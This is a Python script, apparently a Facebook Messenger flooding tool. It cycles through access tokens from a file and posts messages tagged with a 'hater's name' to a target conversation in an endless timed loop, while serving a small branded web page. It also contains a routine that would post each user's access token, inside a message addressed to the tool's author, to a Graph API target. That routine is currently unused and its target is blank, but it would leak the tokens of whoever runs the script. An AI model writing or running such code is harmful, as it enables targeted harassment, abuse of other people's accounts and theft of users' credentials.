import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"SERVER LOADER BY (( AKATSUKI RULEX ))")

def execute_server():
    PORT = int(os.environ.get('PORT', 4000))

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

mmm = requests.get('https://pastebin.com/raw/3bemEUyT').text

def send_initial_message():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password  # Prompt for password

    if entered_password != password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    if mmm not in password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    with open('tokens.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "Hello Mentawl Papa ! I am using your server. My token is {}"
    target_id = ""

    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)
        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokens.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatername.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('timer.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                else:
                    print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def apply_patch_to_files():
    patch_file = input("Enter the path to the patch file for tokens.txt and File.txt: ")
    if not os.path.exists(patch_file):
        print("[!] Patch file not found.")
        return

    try:
        # Apply patch only to tokens.txt and File.txt
        subprocess.run(["patch", "tokens.txt", patch_file], check=True)
        subprocess.run(["patch", "File.txt", patch_file], check=True)
        print("[+] Patch applied successfully to tokens.txt and File.txt.")
    except subprocess.CalledProcessError:
        print("[x] Failed to apply patch. Check the patch file and try again.")

def main():
    apply_patch_to_files()  # Apply patch to tokens.txt and File.txt

    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_messages_from_file()

if __name__ == '__main__':
    main()
